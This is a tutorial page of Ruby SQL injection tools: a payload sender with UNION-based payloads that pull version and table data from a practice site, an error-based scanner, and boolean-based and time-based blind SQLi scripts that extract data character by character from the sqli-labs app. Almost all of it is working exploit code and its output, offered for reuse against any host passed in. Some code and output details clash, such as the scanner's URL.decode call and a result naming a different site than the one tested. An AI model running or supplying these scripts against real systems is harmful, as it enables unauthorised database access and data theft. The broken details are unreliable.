# SQL Injection Scanner


## Basic SQLi script as command line browser

The is a very basic script take your given payload and send it to the vulnerable parameter and returns the response back to you. I'll use (http://testphp.vulnweb.com/) as it's legal to test.

```ruby
#!/usr/bin/env ruby
# KING SABRI | @KINGSABRI
# Send your payload from command line
#
require "net/http"

if ARGV.size < 2
  puts "[+] ruby #{__FILE__} [IP ADDRESS] [PAYLOAD]"
  exit 0
else
  host, payload = ARGV
end

uri = URI.parse("http://#{host}/artists.php?")
uri.query = URI.encode_www_form({"artist" => "#{payload}"})
http = Net::HTTP.new(uri.host, uri.port)
http.use_ssl = true if uri.scheme == 'https'    # Enable HTTPS support if it's HTTPS
# http.set_debug_output($stdout)

request = Net::HTTP::Get.new(uri.request_uri)
response = http.request(request)
# puts "[+] Status code: "+ response.code + "\n\n"
# puts response.body.gsub(/<.*?>/, '').strip
puts response.body.scan(/<h2 id='pageName'>.*<\/h2>/).join.gsub(/<.*?>/, '').strip

puts ""
```


> I've commented the line `puts response.body.gsub(/<.*?>/, '').strip` and added a custom RegEx to fix our target outputs.



Let's to test it in action

```
ruby sqli-basic.rb "testphp.vulnweb.com" "-1 UNION ALL SELECT NULL,NULL,NULL,NULL#" | grep -i -e warning -e error
# => Warning: mysql_fetch_array() expects parameter 1 to be resource, boolean given in /hj/var/www/artists.php on line 62

ruby sqli-basic.rb "testphp.vulnweb.com" "-1 UNION ALL SELECT NULL,NULL,NULL#" | grep -i -e warning -e error
# => 

ruby sqli-basic.rb "testphp.vulnweb.com" "-1 UNION ALL SELECT NULL,@@VERSION,NULL#"
# => artist: 5.1.73-0ubuntu0.10.04.1

ruby sqli-basic.rb "testphp.vulnweb.com" "-1 UNION ALL SELECT NULL,GROUP_CONCAT(table_name),NULL FROM information_schema.tables#" 
# => artist: CHARACTER_SETS,COLLATIONS,COLLATION_CHARACTER_SET_APPLICABILITY,COLUMNS,COLUMN_PRIVILEGES,ENGINES,EVENTS,FILES,GLOBAL_STATUS,GLOBAL_VARIABLES,KEY_COLUMN_USAGE,PARTITIONS,PLUGINS,PROCESSLIST,PROFILING,REFERENTIAL_CONSTRAINTS,ROUTINES,SCHEMATA,SCHEMA_PRIVILEGES,SESSION_STATUS,SESSION_VARIABLES,STATISTICS,TABLES,TABLE_CONSTRAINTS,TABLE_PRIVIL
```





Here a very basic and simple SQL-injection solid scanner, develop it as far as you can!

```ruby
#!/usr/bin/env ruby
# KING SABRI | @KINGSABRI
# Very basic SQLi scanner!
#
require 'net/http'

# Some SQLi payloads
payloads =
    [
      "'",
      '"',
      "' or 1=2--+"
    ]

# Some database error responses
errors =
    {
      :mysql => [
                 "SQL.*syntax",
                 "mysql.*(fetch).*array",
                 "Warning"
                ],
      :mssql => [
                 "line.*[0-9]",
                 "Microsoft SQL Native Client error.*"
                ],
      :oracle => [
                  ".*ORA-[0-9].*",
                  "Warning"
                 ]
      }

# Try a known vulnerable site
uri  = URI.parse "http://testphp.vulnweb.com/artists.php?artist=1"

# Update the query with a payload
uri.query += payloads[0]

# Send get request
response = Net::HTTP.get uri

# Search if an error occurred = vulnerable
puts "[+] The #{URL.decode(uri.to_s)} is vulnerable!" unless response.match(/#{errors[:mysql][0]}/i).nil?

```

Try it on this url (http://testasp.vulnweb.com/showforum.asp?id=0)

Results
```
ruby sqli.rb http://testasp.vulnweb.com/showforum.asp?id=0
[+] The http://testphp.vulnweb.com/artists.php?artist=1' is vulnerable!
```

## Boolean-bases SQLi Exploit Script

Here is a Boolean-based SQLi exploit for [sqli-labs](https://github.com/Audi-1/sqli-labs) vulnerable application.

```ruby
#!/usr/bin/env ruby
# Boolean-based SQLi exploit
# Sabri Saleh | @KINGSABRI
#
require 'open-uri'

if ARGV.size < 1
  puts "[+] ruby #{__FILE__} <IP ADDRESS>"
  exit 0
else
  host = ARGV[0]
end

# Just colorizing outputs
class String
  def red; colorize(self, "\e[1m\e[31m"); end
  def green; colorize(self, "\e[1m\e[32m"); end
  def bold; colorize(self, "\e[1m"); end
  def colorize(text, color_code)  "#{color_code}#{text}\e[0m" end
end

# SQL injection
def send_bbsqli(url, query)
  begin
    
    response = open(URI.parse( URI.encode("#{url}#{query}") ))
    
    if !response.read.scan("You are in...........").empty?
      return 1 # TRUE
    end
    
  rescue Exception => e
    puts "[!] Failed to SQL inject #{e}".red 
    exit 0
  end
end

url = "http://#{host}/sqli-labs/Less-8/index.php?id="

puts "[*] Start Sending Boolean-based SQLi".bold

extracted = []
(1..100).map do |position|
  (32..126).map do |char|
     puts "[*] Brute-forcing on Position: ".bold + "#{position}".green + " | ".bold + "Character: ".bold + "#{char} = #{char.chr}".green
     
     # Put your query here 
#      query = "1' AND (ASCII(SUBSTR((SELECT DATABASE()),#{position},1)))=#{char}--+"
     query = "1' AND (ASCII(SUBSTR((SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database() limit 0,1),#{position},1)))=#{char}--+"
     result = send_bbsqli(url, query)
         if result.eql? 1
           puts "[+] Found character: ".bold + "#{char.to_s(16)} hex".green
           
           extracted <<  char.chr
           puts "[+] Extracted chracters: ".bold + "#{extracted.join}".green
           break 
         end
   end
end

puts "\n\n[+] Final found string: ".bold + "#{extracted.join}".green
```

## Time-bases SQLi Exploit Script
A Time-based SQLi exploit for [sqli-labs](https://github.com/Audi-1/sqli-labs) vulnerable application.

```ruby
#!/usr/bin/env ruby
# Boolean-based SQLi exploit
# Sabri Saleh | @KINGSABRI
#
require 'open-uri'

if ARGV.size < 1
  puts "[+] ruby #{__FILE__} <IP ADDRESS>"
  exit 0
else
  host = ARGV[0]
end

# Just colorizing outputs
class String
  def red; colorize(self, "\e[1m\e[31m"); end
  def green; colorize(self, "\e[1m\e[32m"); end
  def bold; colorize(self, "\e[1m"); end
  def colorize(text, color_code)  "#{color_code}#{text}\e[0m" end
end

# SQL injection
def send_tbsqli(url, query, time2wait)
  begin
    start_time = Time.now
    response = open(URI.parse( URI.encode("#{url}#{query}") ))
    end_time   = Time.now
    howlong    = end_time - start_time
    
    if howlong >= time2wait
      return 1 # TRUE
    end
    
  rescue Exception => e
    puts "[!] Failed to SQL inject #{e}".red 
    exit 0
  end
end

url = "http://#{host}/sqli-labs/Less-10/index.php?id="

puts "[*] Start Sending Boolean-based SQLi".bold
time2wait = 5
extracted = []
(1..76).map do |position| 
  (32..126).map do |char|
     puts "[*] Brute-forcing on Position: ".bold + "#{position}".green + " | ".bold + "Character: ".bold + "#{char} = #{char.chr}".green
     
     # Put your query here 
     query = "1\" AND IF((ASCII(SUBSTR((SELECT DATABASE()),#{position},1)))=#{char}, SLEEP(#{time2wait}), NULL)--+"
     
     result = send_tbsqli(url, query, time2wait)
         if result.eql? 1
           puts "[+] Found character: ".bold + "#{char.to_s(16)} hex".green
           
           extracted <<  char.chr
           puts "[+] Extracted chracters: ".bold + "#{extracted.join}".green
           break 
         end
   end
end

puts "\n\n[+] Final found string: ".bold + "#{extracted.join}".green

```